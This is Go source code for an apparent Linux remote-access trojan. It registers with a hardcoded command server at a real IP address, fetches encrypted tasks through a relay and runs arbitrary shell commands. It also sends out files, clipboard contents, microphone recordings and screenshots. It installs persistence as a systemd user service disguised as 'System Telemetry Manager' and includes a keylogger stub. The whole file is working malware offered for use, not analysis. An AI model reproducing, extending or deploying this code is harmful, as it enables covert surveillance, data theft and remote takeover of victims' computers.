// 1. MUST be package main to be an executable binary
package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	// 2. Import your crypto package using the module name from go.mod
	crypto "mrg2026/Crypto"
)

const OP_SECRET = "GHOST_KEY_ALPHA"

var pendingAudioLoot string
var currentWorkingDir, _ = os.Getwd()
var keyLogBuffer strings.Builder

type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"`
	Listen   string `json:"listen"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

func main() {
	// Recovery loop to ensure the ghost stays alive on errors
	defer func() {
		if r := recover(); r != nil {
			time.Sleep(5 * time.Second)
			main()
		}
	}()

	h, _ := os.Hostname()
	suffix := ""

	if checkAdmin() {
		suffix = "-ROOT"
	}

	// Generate identity string (e.g., DESKTOP-ROOT-123)
	targetID := strings.ToUpper(fmt.Sprintf("%s%s-%d", h, suffix, time.Now().Unix()%1000))

	// Only start keylogger if we have root (Linux requirement for /dev/input)
	if checkAdmin() {
		go startLinuxKeylogger()
	}

	for {
		fmt.Printf("[+] Heartbeat [%s]: Polling Brain...\n", targetID)
		err := pollAndExecute(targetID)
		if err != nil {
			fmt.Printf("[!] Error: %v\n", err)
			time.Sleep(10 * time.Second)
			continue
		}
		time.Sleep(10 * time.Second)
	}
}

// --- LINUX UTILITIES ---

func checkAdmin() bool {
	return os.Geteuid() == 0
}

func getClipboardText() string {
	// Attempts to use xclip (X11) or wl-paste (Wayland)
	out, err := exec.Command("sh", "-c", "xclip -o -selection clipboard || wl-paste").Output()
	if err != nil {
		return "[!] Clipboard tools (xclip/wl-paste) not found on target."
	}
	return string(out)
}

func setupPersistence() error {
	exePath, _ := os.Executable()
	home, _ := os.UserHomeDir()

	// Creates a Systemd User Unit - stays active after logout
	serviceContent := fmt.Sprintf(`[Unit]
Description=System Telemetry Manager
[Service]
ExecStart=%s
Restart=always
[Install]
WantedBy=default.target`, exePath)

	unitDir := filepath.Join(home, ".config/systemd/user")
	_ = os.MkdirAll(unitDir, 0755)
	unitPath := filepath.Join(unitDir, "telemetry.service")

	err := os.WriteFile(unitPath, []byte(serviceContent), 0644)
	if err != nil {
		return err
	}

	// Reload systemd and enable the new service
	exec.Command("systemctl", "--user", "daemon-reload").Run()
	return exec.Command("systemctl", "--user", "enable", "--now", "telemetry.service").Run()
}

func startLinuxKeylogger() {
	// Placeholder for /dev/input/eventX reading logic
	keyLogBuffer.WriteString("[LOGGING_STARTED_ON_LINUX_ROOT]\n")
}

// --- CORE ENGINE ---

func pollAndExecute(targetID string) error {
	// 1. REGISTRATION
	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
	if err != nil {
		return err
	}
	json.NewEncoder(c).Encode(AuthRequest{
		Type: "client_register", TargetID: targetID, Key: OP_SECRET, OS: runtime.GOOS, Arch: runtime.GOARCH,
	})
	c.Close()

	time.Sleep(150 * time.Millisecond)

	// 2. POLL FOR WORK
	c, _ = net.Dial("tcp", "18.184.135.220:8080")
	json.NewEncoder(c).Encode(AuthRequest{Type: "client_poll", TargetID: targetID})
	var r RoutingInfo
	json.NewDecoder(c).Decode(&r)
	c.Close()

	if r.RelayAddr == "" {
		return nil
	}

	// 3. BRIDGE TO RELAY
	relayConn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
	if err != nil {
		return err
	}
	defer relayConn.Close()

	// Secret Knock
	relayConn.Write([]byte("8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"))

	// Key Exchange
	sessionKey := make([]byte, 32)
	if _, err = io.ReadFull(relayConn, sessionKey); err != nil {
		return err
	}

	// Read Encrypted Task
	cmdEnc, _ := bufio.NewReader(relayConn).ReadString('\n')
	rawCmd, _ := crypto.DecryptPayload(strings.TrimSpace(cmdEnc), sessionKey)

	var finalOutput string

	// --- LOGIC GATEWAY (Mapped to Functions) ---

	if strings.HasPrefix(rawCmd, "download ") {
		path := strings.TrimPrefix(rawCmd, "download ")
		data, err := os.ReadFile(path)
		if err != nil {
			finalOutput = "[!] Error: " + err.Error()
		} else {
			finalOutput = "FILE_DATA:" + filepath.Base(path) + "|" + base64.StdEncoding.EncodeToString(data)
		}

	} else if rawCmd == "clip" {
		captured := getClipboardText()
		finalOutput = fmt.Sprintf("\n--- [LINUX CLIPBOARD] ---\n%s", captured)

	} else if strings.HasPrefix(rawCmd, "persist") {
		err := setupPersistence()
		if err != nil {
			finalOutput = fmt.Sprintf("[!] PERSISTENCE ERROR: %v", err)
		} else {
			finalOutput = "[+] LINUX ANCHOR DROPPED: Systemd user service active."
		}

	} else if rawCmd == "checkaudio" {
		if pendingAudioLoot != "" {
			finalOutput = pendingAudioLoot
			pendingAudioLoot = ""
		} else {
			finalOutput = "[!] No audio loot pending. Use 'listen' first."
		}

	} else if strings.HasPrefix(rawCmd, "listen ") {
		durationStr := strings.TrimPrefix(rawCmd, "listen ")
		sec, _ := strconv.Atoi(durationStr)
		if sec <= 0 {
			sec = 10
		}

		tempFile := "/tmp/.mrg_audio.wav"
		go func(s int) {
			exec.Command("arecord", "-d", strconv.Itoa(s), "-f", "cd", tempFile).Run()
			data, err := os.ReadFile(tempFile)
			if err == nil {
				pendingAudioLoot = "FILE_DATA:mic_capture.wav|" + base64.StdEncoding.EncodeToString(data)
				os.Remove(tempFile)
			}
		}(sec)
		finalOutput = fmt.Sprintf("[+] arecord initiated for %ds. Use 'checkaudio' to retrieve.", sec)

	} else if rawCmd == "snap" {
		temp := "/tmp/.mrg_snap.png"
		exec.Command("scrot", temp).Run() // requires 'scrot' tool
		data, err := os.ReadFile(temp)
		if err != nil {
			finalOutput = "[!] Screenshot tool (scrot) missing or capture failed."
		} else {
			finalOutput = "SNAP_DATA:" + base64.StdEncoding.EncodeToString(data)
			os.Remove(temp)
		}

	} else if rawCmd == "sysinfo" {
		cpu, _ := exec.Command("sh", "-c", "grep 'model name' /proc/cpuinfo | head -1").Output()
		mem, _ := exec.Command("sh", "-c", "free -h | grep Mem | awk '{print $2}'").Output()
		finalOutput = fmt.Sprintf("\n[+] OS: %s\n[+] CPU: %s\n[+] RAM: %s", runtime.GOOS, string(cpu), string(mem))

	} else {
		// Default Bash Execution
		cmdObj := exec.Command("sh", "-c", rawCmd)
		cmdObj.Dir = currentWorkingDir
		out, _ := cmdObj.CombinedOutput()
		finalOutput = string(out)
	}

	// 4. Encrypt and Return
	encRes, _ := crypto.EncryptPayload(finalOutput, sessionKey)
	fmt.Fprintf(relayConn, "%s\n", encRes)
	return nil
}
